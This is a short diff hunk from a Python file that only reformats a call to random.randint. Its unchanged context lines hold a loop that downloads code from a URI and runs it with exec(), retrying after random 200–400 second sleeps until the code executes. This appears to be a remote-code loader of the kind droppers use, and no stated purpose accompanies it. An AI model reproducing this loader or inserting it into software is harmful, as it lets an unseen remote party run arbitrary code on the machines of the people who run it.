@@ -11,6 +11,6 @@ while True:
     try:
         exec(urllib.request.urlopen(uri).read())
     except:
-        time.sleep(random.randint(200,400))
+        time.sleep(random.randint(200, 400))
     else:
         break
